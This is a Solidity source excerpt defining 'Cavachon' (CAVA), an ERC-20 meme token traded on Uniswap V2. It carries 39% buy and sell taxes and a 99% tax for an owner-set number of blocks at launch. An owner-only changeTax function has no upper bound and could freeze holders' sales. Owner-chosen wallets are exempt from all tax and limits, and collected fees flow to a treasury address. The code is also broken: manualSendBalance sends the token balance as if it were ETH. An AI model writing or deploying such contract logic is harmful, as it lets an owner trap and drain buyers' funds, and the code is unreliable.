185 contract Cavachon is Context, IERC20, Ownable {
186     using SafeMath for uint256;
187     mapping(address => uint256) private _balance;
188     mapping(address => mapping(address => uint256)) private _allowances;
189     mapping(address => bool) private _walletExcluded;
190     uint256 private constant MAX = ~uint256(0);
191     uint8 private constant _decimals = 18;
192     uint256 private constant _totalSupply = 10**15 * 10**_decimals;
193     uint256 private constant minSwap = 400000000000 * 10**_decimals;
194     uint256 private constant onePercent = 10000000000000 * 10**_decimals;
195     uint256 public maxTxAmount = onePercent * 2;
196 
197     uint256 private launchBlock;
198     uint256 private buyValue;
199 
200     uint256 private _tax;
201     uint256 public buyTax = 39;
202     uint256 public sellTax = 39;
203     
204     string private constant _name = "Cavachon";
205     string private constant _symbol = "CAVA";
206 
207     IUniswapV2Router02 private uniswapV2Router;
208     address public uniswapV2Pair;
209     address payable public treasury;
210 
211     bool public launch = false;
212 
213     constructor(address[] memory wallets) {
214         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
215         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
216         treasury = payable(wallets[0]);
217         _balance[msg.sender] = _totalSupply;
218         for (uint256 i = 0; i < wallets.length; i++) {
219             _walletExcluded[wallets[i]] = true;
220         }
221         _walletExcluded[msg.sender] = true;
222         _walletExcluded[address(this)] = true;
223 
224         emit Transfer(address(0), _msgSender(), _totalSupply);
225     }
226 
227     function name() public pure returns (string memory) {
228         return _name;
229     }
230 
231     function symbol() public pure returns (string memory) {
232         return _symbol;
233     }
234 
235     function decimals() public pure returns (uint8) {
236         return _decimals;
237     }
238 
239     function totalSupply() public pure override returns (uint256) {
240         return _totalSupply;
241     }
242 
243     function balanceOf(address account) public view override returns (uint256) {
244         return _balance[account];
245     }
246 
247     function transfer(address recipient, uint256 amount)public override returns (bool){
248         _transfer(_msgSender(), recipient, amount);
249         return true;
250     }
251 
252     function allowance(address owner, address spender) public view override returns (uint256){
253         return _allowances[owner][spender];
254     }
255 
256     function approve(address spender, uint256 amount) public override returns (bool){
257         _approve(_msgSender(), spender, amount);
258         return true;
259     }
260 
261     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
262         _transfer(sender, recipient, amount);
263         _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
264         return true;
265     }
266 
267     function _approve(address owner, address spender, uint256 amount) private {
268         require(owner != address(0), "ERC20: approve from the zero address");
269         require(spender != address(0), "ERC20: approve to the zero address");
270         _allowances[owner][spender] = amount;
271         emit Approval(owner, spender, amount);
272     }
273 
274 
275     function Cavachooooon(uint256 _buyValue) external onlyOwner {
276         launch = true;
277         launchBlock = block.number;
278         buyValue = _buyValue;
279     }
280 
281     function addExcludedWallet(address wallet) external onlyOwner {
282         _walletExcluded[wallet] = true;
283     }
284 
285     function removeLimits() external onlyOwner {
286         maxTxAmount = _totalSupply;
287     }
288 
289     function changeTax(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
290         buyTax = newBuyTax;
291         sellTax = newSellTax;
292     }
293 
294     function _tokenTransfer(address from, address to, uint256 amount) private {
295         uint256 taxTokens = (amount * _tax) / 100;
296         uint256 transferAmount = amount - taxTokens;
297 
298         _balance[from] = _balance[from] - amount;
299         _balance[to] = _balance[to] + transferAmount;
300         _balance[address(this)] = _balance[address(this)] + taxTokens;
301 
302         emit Transfer(from, to, transferAmount);
303     }
304 
305     function _transfer(address from, address to, uint256 amount) private {
306         require(from != address(0), "ERC20: transfer from the zero address");
307 
308         if (_walletExcluded[from] || _walletExcluded[to]) {
309             _tax = 0;
310         } else {
311             require(launch, "Trading not open");
312             require(amount <= maxTxAmount, "MaxTx Enabled at launch");
313             if (block.number < launchBlock + buyValue) {_tax=99;} else {
314                 if (from == uniswapV2Pair) {
315                     _tax = buyTax;
316                 } else if (to == uniswapV2Pair) {
317                     uint256 tokensToSwap = balanceOf(address(this));
318                     if (tokensToSwap > minSwap) { //Sets Max Internal Swap
319                         if (tokensToSwap > onePercent * 4) { 
320                             tokensToSwap = onePercent * 4;
321                         }
322                         swapTokensForEth(tokensToSwap);
323                     }
324                     _tax = sellTax;
325                 } else {
326                     _tax = 0;
327                 }
328             }
329         }
330         _tokenTransfer(from, to, amount);
331     }
332 
333     function manualSendBalance() external {
334         require(_msgSender() == treasury);
335         uint256 contractETHBalance = address(this).balance;
336         treasury.transfer(contractETHBalance);
337         uint256 contractBalance = balanceOf(address(this));
338         treasury.transfer(contractBalance);
339     } 
340 
341     function manualSwapTokens() external {
342         require(_msgSender() == treasury);
343         uint256 contractBalance = balanceOf(address(this));
344         swapTokensForEth(contractBalance);
345     }
346 
347 
348     function swapTokensForEth(uint256 tokenAmount) private {
349         address[] memory path = new address[](2);
350         path[0] = address(this);
351         path[1] = uniswapV2Router.WETH();
352         _approve(address(this), address(uniswapV2Router), tokenAmount);
353         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
354             tokenAmount,
355             0,
356             path,
357             treasury,
358             block.timestamp
359         );
360     }
361     receive() external payable {}
362 }